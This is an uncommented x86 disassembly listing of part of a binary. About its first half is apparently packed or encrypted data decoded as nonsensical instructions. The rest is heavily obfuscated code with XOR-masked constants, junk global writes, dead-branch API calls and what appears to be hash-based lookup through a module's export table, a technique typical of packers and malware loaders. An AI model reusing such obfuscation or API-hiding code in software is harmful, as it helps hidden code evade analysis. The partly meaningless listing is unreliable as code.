  408084:	fist   WORD PTR [ebx]
  408086:	xchg   esi,ebp
  408088:	fisttp DWORD PTR [edi]
  40808a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40808b:	sbb    BYTE PTR [edi-0x25],bh
  40808e:	call   0x1487:0x74cf397c
  408095:	and    DWORD PTR [ecx],ecx
  408097:	mov    ah,0xb7
  408099:	in     al,dx
  40809a:	clc    
  40809b:	lea    edx,[edx-0x6200e4fe]
  4080a1:	or     al,0xd
  4080a3:	lods   eax,DWORD PTR ds:[esi]
  4080a4:	pop    ss
  4080a5:	out    0x48,al
  4080a7:	mov    al,0xf9
  4080a9:	pop    esi
  4080aa:	test   DWORD PTR [esi-0x8],ebx
  4080ad:	add    BYTE PTR [edi+0x5493567b],cl
  4080b3:	mov    ds:0xf6080411,eax
  4080b8:	pushf  
  4080b9:	pop    esp
  4080ba:	mov    eax,ds:0xb64b4c21
  4080bf:	nop
  4080c0:	rcr    ebp,1
  4080c2:	mov    esp,0x5300354c
  4080c7:	xchg   esi,eax
  4080c8:	mov    ch,0x1
  4080ca:	pop    ecx
  4080cb:	pop    ds
  4080cc:	call   0x927f8c03
  4080d1:	out    0x67,eax
  4080d3:	in     al,0xa3
  4080d5:	mov    WORD PTR [edi],?
  4080d7:	cdq    
  4080d8:	xor    al,0x4
  4080da:	ins    BYTE PTR es:[edi],dx
  4080db:	nop
  4080dc:	pop    ecx
  4080dd:	mov    ebx,0x8302d594
  4080e2:	or     ah,BYTE PTR [ebx]
  4080e4:	clts   
  4080e6:	pop    eax
  4080e7:	mov    al,ds:0x70fd83fc
  4080ec:	jns    0x4080a0
  4080ee:	mov    bh,0x30
  4080f0:	loop   0x4080b3
  4080f2:	cld    
  4080f3:	icebp  
  4080f4:	ud1    ecx,DWORD PTR ds:0xd740af64
  4080fb:	push   es
  4080fc:	popa   
  4080fd:	xlat   BYTE PTR ds:[ebx]
  4080fe:	sti    
  4080ff:	mov    edi,0xf6bdde68
  408104:	fsubr  st,st(3)
  408106:	cmp    ebp,ecx
  408108:	or     eax,0x5f6d6e21
  40810d:	dec    ebx
  40810e:	mov    eax,ds:0xbf20b8e
  408113:	inc    BYTE PTR [eax+0x28386909]
  408119:	mov    ch,0xfa
  40811b:	inc    ecx
  40811c:	sub    al,0xd6
  40811e:	cmp    edx,DWORD PTR [ebp+0x58c459c7]
  408124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408125:	sub    dh,BYTE PTR [ebx]
  408127:	daa    
  408128:	popa   
  408129:	imul   edi,DWORD PTR [esi],0x94f7b17b
  40812f:	jmp    0x801b:0x88563c13
  408136:	(bad)  
  408137:	xchg   ebx,eax
  408138:	aaa    
  408139:	enter  0xb7bb,0xed
  40813d:	popa   
  40813e:	retf   
  40813f:	shr    BYTE PTR [ebx+0x73],cl
  408142:	cmp    ebx,ebp
  408144:	xchg   esi,eax
  408145:	mov    ecx,0x887dff12
  40814a:	std    
  40814b:	rcr    esp,0x82
  40814e:	in     al,0x35
  408150:	mov    bl,0xc7
  408152:	call   0xc7b:0x656e990f
  408159:	and    ecx,esp
  40815b:	bound  eax,QWORD PTR [esi]
  40815d:	sub    dh,ch
  40815f:	sbb    BYTE PTR [edx-0x58bad93c],ch
  408165:	mov    cl,0xbc
  408167:	add    BYTE PTR [ebp-0x1b],0x74
  40816b:	inc    edx
  40816c:	rol    DWORD PTR [eax-0x24],cl
  40816f:	fstp   QWORD PTR [esi]
  408171:	add    al,0x30
  408173:	jae    0x408113
  408175:	inc    edi
  408176:	sbb    al,0x88
  408178:	and    BYTE PTR [eax-0x5f],0xf2
  40817c:	dec    esp
  40817d:	inc    esi
  40817e:	push   edx
  40817f:	call   0x46e5:0x5efd91e5
  408186:	dec    ebx
  408187:	cmp    DWORD PTR [eax+0xd7a11ff],ebp
  40818d:	push   ebp
  40818e:	adc    ebx,ecx
  408190:	pop    esi
  408191:	in     al,0xd8
  408193:	leave  
  408194:	idiv   BYTE PTR [eax-0x707fc29]
  40819a:	jmp    DWORD PTR [edi+0x1c8a7096]
  4081a0:	lods   eax,DWORD PTR ds:[esi]
  4081a1:	into   
  4081a2:	fs xchg ecx,eax
  4081a4:	mov    WORD PTR [esi-0x3f],ds
  4081a7:	jne    0x4081c8
  4081a9:	arpl   WORD PTR [esi+0x60452719],bp
  4081af:	push   ebp
  4081b0:	cmp    BYTE PTR [ebx],bh
  4081b2:	stos   DWORD PTR es:[edi],eax
  4081b3:	xor    BYTE PTR [edx+ecx*2+0x41],bl
  4081b7:	aaa    
  4081b8:	push   edx
  4081b9:	scas   eax,DWORD PTR es:[edi]
  4081ba:	ret    
  4081bb:	retf   0x53c
  4081be:	sti    
  4081bf:	(bad)  
  4081c0:	mov    esp,0xca72aca
  4081c5:	fdiv   QWORD PTR [eax]
  4081c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081c8:	mov    bh,bh
  4081ca:	pop    esi
  4081cb:	rol    DWORD PTR [ecx-0x7a],1
  4081ce:	jnp    0x4081d7
  4081d0:	stos   DWORD PTR es:[edi],eax
  4081d1:	fs or  edx,esi
  4081d4:	repnz sub WORD PTR [ebp+0x56a1c4fd],0x3650
  4081de:	gs jnp 0x408179
  4081e1:	cwde   
  4081e2:	leave  
  4081e3:	pop    ebx
  4081e4:	xor    al,0x43
  4081e6:	and    dl,bl
  4081e8:	in     al,dx
  4081e9:	adc    al,0x64
  4081eb:	aas    
  4081ec:	sub    bl,BYTE PTR [eax+esi*1]
  4081ef:	mov    ds:0x7f3fae35,al
  4081f4:	mov    eax,ds:0x937d5b3c
  4081f9:	je     0x40820b
  4081fb:	jge    0x4081e6
  4081fd:	pop    es
  4081fe:	jb     0x4081d2
  408200:	cmp    eax,0xb6ccd707
  408205:	fisubr DWORD PTR [ecx]
  408207:	xlat   BYTE PTR ds:[ebx]
  408208:	retf   
  408209:	sahf   
  40820a:	jb     0x40819a
  40820c:	(bad)  
  40820d:	arpl   WORD PTR [ebp-0x10],ax
  408210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408211:	or     DWORD PTR [esi],ebx
  408213:	enter  0x7d6b,0x51
  408217:	jae    0x408217
  408219:	mov    eax,0xe1e38e49
  40821e:	pop    esi
  40821f:	dec    esp
  408220:	iret   
  408221:	pop    ebx
  408222:	xor    eax,0x16170e6b
  408227:	in     eax,0xf4
  408229:	ret    
  40822a:	mov    dh,0xcc
  40822c:	jb     0x4081b6
  40822e:	dec    esi
  40822f:	std    
  408230:	sbb    edx,DWORD PTR [eax+0x4f]
  408233:	jnp    0x40828c
  408235:	arpl   WORD PTR [ebp-0x58],si
  408238:	into   
  408239:	mov    ch,0x92
  40823b:	jp     0x4081f9
  40823d:	pop    ebx
  40823e:	mov    al,ds:0x768e0a87
  408244:	jns    0x40822e
  408246:	neg    BYTE PTR [edi+0x4bf29d79]
  40824c:	ret    
  40824d:	add    DWORD PTR [esi+0xce4a9ae],edi
  408253:	adc    BYTE PTR [edi],0x90
  408256:	inc    ebp
  408257:	jmp    0x40828a
  408259:	cs dec ecx
  40825b:	call   0xaf641e62
  408260:	inc    ecx
  408261:	inc    ecx
  408262:	jbe    0x4082cc
  408264:	je     0x408289
  408266:	sti    
  408267:	sub    DWORD PTR [esi-0x491d2956],0x16
  40826e:	add    ah,dl
  408270:	pushf  
  408271:	xchg   edx,eax
  408272:	fiadd  WORD PTR [edx+esi*4]
  408275:	mov    edx,0xb3f165ea
  40827a:	and    edi,DWORD PTR [edi]
  40827c:	cwde   
  40827d:	sbb    bh,BYTE PTR [ebx+0x4d]
  408280:	sar    BYTE PTR [ebp+0x18],0x17
  408284:	xchg   edi,eax
  408285:	adc    eax,0xac394215
  40828a:	(bad)  
  40828b:	mov    dh,0xbc
  40828d:	dec    edx
  40828e:	(bad)  
  40828f:	xor    dh,BYTE PTR [esi]
  408291:	fistp  QWORD PTR [ebx]
  408293:	das    
  408294:	in     eax,0xda
  408296:	adc    edi,DWORD PTR [eax-0x78]
  408299:	(bad)  [ebp+0x22]
  40829c:	(bad)  
  40829e:	adc    bl,BYTE PTR ds:[esi-0x48]
  4082a2:	mov    al,ch
  4082a4:	frstor ds:0x2582c889
  4082aa:	jbe    0x408243
  4082ac:	or     al,0x39
  4082ae:	cdq    
  4082af:	inc    ecx
  4082b0:	fscale 
  4082b2:	loop   0x40827d
  4082b4:	jbe    0x408301
  4082b6:	fsubrp st(3),st
  4082b8:	adc    DWORD PTR [edx+esi*8-0x2d],ebp
  4082bc:	and    al,0x65
  4082be:	loopne 0x408298
  4082c0:	xor    esi,ebx
  4082c2:	sub    ebx,DWORD PTR [edx+0x25f62156]
  4082c8:	xor    DWORD PTR [edi],edx
  4082ca:	daa    
  4082cb:	mov    ds:0xfd4ad184,eax
  4082d0:	push   0x9be9559c
  4082d5:	sub    eax,0x187bf050
  4082da:	mov    edi,0xb66963e3
  4082df:	cmp    BYTE PTR [edi+eiz*2],bh
  4082e2:	and    eax,0xa458f75
  4082e7:	sti    
  4082e8:	fsubr  DWORD PTR ds:0x34f4ef06
  4082ee:	out    0x43,eax
  4082f0:	xor    DWORD PTR [edi],edx
  4082f2:	(bad)  
  4082f3:	jo     0x40827e
  4082f5:	and    eax,0x690a9f91
  4082fa:	sbb    bh,bh
  4082fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082fd:	push   es
  4082fe:	loope  0x40828c
  408300:	lds    eax,FWORD PTR [ecx]
  408302:	addr16 mov al,ds:0x41ed
  408306:	mov    cl,0x16
  408308:	popf   
  408309:	mov    dl,0xcf
  40830b:	aad    0x71
  40830d:	cld    
  40830e:	mov    cs,WORD PTR [eax]
  408310:	sbb    edi,DWORD PTR [ebx]
  408312:	pop    ds
  408313:	mov    al,ds:0xc442c97d
  408318:	xor    DWORD PTR [ecx-0xf5a954],ecx
  40831e:	dec    ebx
  40831f:	xchg   esp,eax
  408320:	cmp    DWORD PTR [eax+edx*2],0xc6dbe526
  408327:	icebp  
  408328:	dec    ecx
  408329:	mov    ch,0x6
  40832b:	jge    0x408330
  40832d:	push   ebp
  40832e:	jecxz  0x4082f0
  408330:	dec    eax
  408331:	push   esi
  408332:	xchg   BYTE PTR [ebx+0xb],dl
  408335:	jno    0x408390
  408337:	leave  
  408338:	and    cl,BYTE PTR [ebp+0x36]
  40833b:	mov    bh,0xd8
  40833d:	xor    eax,DWORD PTR [edx+0xe]
  408340:	cli    
  408341:	daa    
  408342:	je     0x408398
  408344:	retf   0xc0fb
  408347:	push   esp
  408348:	mov    dl,0xd
  40834a:	into   
  40834b:	sbb    al,0x4d
  40834d:	xlat   BYTE PTR ds:[ebx]
  40834e:	les    ecx,FWORD PTR [ecx-0x32e128f8]
  408354:	inc    edi
  408355:	push   ecx
  408356:	xchg   esp,eax
  408357:	std    
  408358:	in     eax,dx
  408359:	inc    ebx
  40835a:	jno    0x40833d
  40835c:	xchg   esi,eax
  40835d:	jmp    0xddc4:0x340ea653
  408364:	aaa    
  408365:	outs   dx,BYTE PTR ds:[esi]
  408366:	push   0xffffffd1
  408368:	and    eax,DWORD PTR [edi+0x39]
  40836b:	imul   BYTE PTR [esi+0x3a14a8ab]
  408371:	dec    esi
  408372:	lods   eax,DWORD PTR ds:[esi]
  408373:	stos   BYTE PTR es:[edi],al
  408374:	pop    edi
  408375:	push   ebx
  408376:	stos   DWORD PTR es:[edi],eax
  408377:	not    DWORD PTR ds:0x831a5c50
  40837d:	xlat   BYTE PTR ds:[ebx]
  40837e:	push   esp
  40837f:	mov    esp,?
  408381:	sbb    eax,0xf46a53a
  408386:	inc    ecx
  408387:	int    0xe
  408389:	add    ah,BYTE PTR [ecx+0x205b5f38]
  40838f:	dec    esi
  408390:	xor    eax,0x63031acf
  408395:	dec    ebx
  408396:	sub    al,0x51
  408398:	cdq    
  408399:	scas   eax,DWORD PTR es:[edi]
  40839a:	mov    bh,0xca
  40839c:	mov    eax,0xfa2f53c
  4083a1:	jg     0x408329
  4083a3:	int3   
  4083a4:	in     al,0x5
  4083a6:	inc    ecx
  4083a7:	cwde   
  4083a8:	xchg   esp,eax
  4083a9:	std    
  4083aa:	mov    WORD PTR [ebp-0x80],ss
  4083ad:	(bad)  
  4083ae:	sub    esp,eax
  4083b0:	(bad)  
  4083b1:	mov    es,WORD PTR [edi]
  4083b3:	push   ds
  4083b4:	fnsave [edi]
  4083b6:	inc    eax
  4083b7:	sbb    edi,ebp
  4083b9:	xor    edi,ebp
  4083bb:	inc    eax
  4083bc:	push   esi
  4083bd:	sub    al,0xfc
  4083bf:	inc    ebx
  4083c0:	pop    DWORD PTR ds:0x3d0c3275
  4083c6:	mov    al,bl
  4083c8:	pop    edi
  4083c9:	scas   al,BYTE PTR es:[edi]
  4083ca:	out    dx,al
  4083cb:	adc    ch,ch
  4083cd:	sub    al,0xdd
  4083cf:	(bad)  
  4083d0:	mov    ecx,0xd4c1531b
  4083d5:	fwait
  4083d6:	loop   0x40839f
  4083d8:	mov    ebp,ebp
  4083da:	bound  esp,QWORD PTR [eax-0x17777f8]
  4083e0:	sbb    DWORD PTR [edi+0x65],eax
  4083e3:	push   0xffffffc4
  4083e5:	cmp    DWORD PTR [edi+0x5b],eax
  4083e8:	jge    0x408395
  4083ea:	aam    0x2
  4083ec:	test   DWORD PTR [edi+0x56367c7f],ebx
  4083f2:	xchg   esi,eax
  4083f3:	mov    ss,WORD PTR [esi]
  4083f5:	call   0xfd60:0x9caf7b89
  4083fc:	loopne 0x40839a
  4083fe:	je     0x408397
  408400:	or     DWORD PTR [ebx+0x4d504f19],0x3e0157b9
  40840a:	or     DWORD PTR [ebp+0x5ac6e392],eax
  408410:	sbb    eax,0x623a702
  408415:	push   eax
  408416:	repz jns 0x408491
  408419:	das    
  40841a:	add    BYTE PTR [eax],0xf3
  40841d:	test   dl,ch
  40841f:	or     al,0xe7
  408421:	xchg   edi,eax
  408422:	dec    ebp
  408423:	mov    ebx,0x241216a
  408428:	call   0xbf7f:0x1fc65595
  40842f:	pop    eax
  408430:	and    BYTE PTR [edx+0x75],al
  408433:	jae    0x408452
  408435:	out    dx,al
  408436:	mov    ch,0xf6
  408438:	sti    
  408439:	je     0x408416
  40843b:	mov    ds:0x2908805a,al
  408440:	sbb    cl,BYTE PTR [ebp-0x69]
  408443:	out    0x7d,al
  408445:	mov    al,0x50
  408447:	sbb    ebx,0x41
  40844a:	rcl    DWORD PTR [ebp-0x14719dc2],cl
  408450:	xchg   edx,eax
  408451:	cmc    
  408452:	or     BYTE PTR [esi],0xdb
  408455:	and    ah,BYTE PTR [edi-0x6]
  408458:	sub    DWORD PTR [ecx+edi*1+0x1e],ebx
  40845c:	mov    ch,0xa1
  40845e:	or     BYTE PTR [ebx-0x76],bl
  408461:	xchg   ebx,eax
  408462:	test   eax,0x1f808f0a
  408467:	mov    bl,0xf9
  408469:	mov    al,BYTE PTR [eax+edx*1]
  40846c:	mov    BYTE PTR [ebp-0x1],al
  40846f:	mov    eax,DWORD PTR [ebp-0x30]
  408472:	mov    edx,DWORD PTR [ebp-0xc]
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x430a1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x430a48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x430a4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x430a20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
